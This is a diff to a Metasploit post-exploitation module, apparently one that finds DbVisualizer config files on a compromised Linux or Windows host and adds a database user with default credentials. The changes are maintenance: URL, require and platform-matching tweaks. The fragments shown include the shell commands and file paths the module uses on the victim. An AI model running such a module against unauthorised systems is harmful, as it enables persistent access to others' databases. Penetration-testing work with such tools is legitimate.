@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/auxiliary/report'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
   include Msf::Post::Unix
 
@@ -35,7 +33,7 @@ class MetasploitModule < Msf::Post
         OptString.new('DBALIAS', [true,'Use dbvis_enum module to find out databases and aliases', 'localhost']),
         OptString.new('DBUSERNAME', [true,'The user you want to add to the remote database', 'msf']),
         OptString.new('DBPASSWORD', [true,'User password to set', 'msfRocks'])
-      ], self.class)
+      ])
 
   end
 
@@ -58,7 +56,7 @@ class MetasploitModule < Msf::Post
   # Check if the alias exist and if database is supported by this script
   def exist_and_supported()
     case session.platform
-    when /linux/
+    when 'linux'
       user = session.shell_command("whoami")
       print_status("Current user is #{user}")
       if (user =~ /root/)
@@ -67,7 +65,7 @@ class MetasploitModule < Msf::Post
          user_base = "/home/#{user}/"
       end
       dbvis_file = "#{user_base}.dbvis/config70/dbvis.xml"
-    when /win/
+    when 'windows'
       user_profile = session.sys.config.getenv('USERPROFILE')
       dbvis_file = "#{user_profile}\\.dbvis\\config70\\dbvis.xml"
     end
@@ -76,16 +74,18 @@ class MetasploitModule < Msf::Post
       #File not found, we next try with the old config path
       print_status("File not found: #{dbvis_file}")
       print_status("This could be an older version of dbvis, trying old path")
+
       case session.platform
-      when /linux/
+      when 'linux'
         dbvis_file = "#{user_base}.dbvis/config/dbvis.xml"
-      when /win/
+      when 'windows'
         dbvis_file = "#{user_profile }\\.dbvis\\config\\dbvis.xml"
       end
       unless file?(dbvis_file)
         print_error("File not found: #{dbvis_file}")
         return
       end
+
       old_version = true
     end
 
@@ -154,7 +154,7 @@ class MetasploitModule < Msf::Post
   # Find path to dbviscmd.sh|bat
   def find_dbviscmd
     case session.platform
-    when /linux/
+    when 'linux'
       dbvis = session.shell_command("locate dbviscmd.sh").chomp
       if dbvis.chomp == ""
         print_error("dbviscmd.sh not found")
@@ -162,7 +162,7 @@ class MetasploitModule < Msf::Post
       else
         print_good("Dbviscmd found : #{dbvis}")
       end
-    when /win/
+    when 'windows'
       # Find program files
       progfiles_env = session.sys.config.getenvs('ProgramFiles(X86)', 'ProgramFiles')
       progfiles_x86 = progfiles_env['ProgramFiles(X86)']
@@ -241,5 +241,4 @@ class MetasploitModule < Msf::Post
     end
     return nil
   end
-
 end
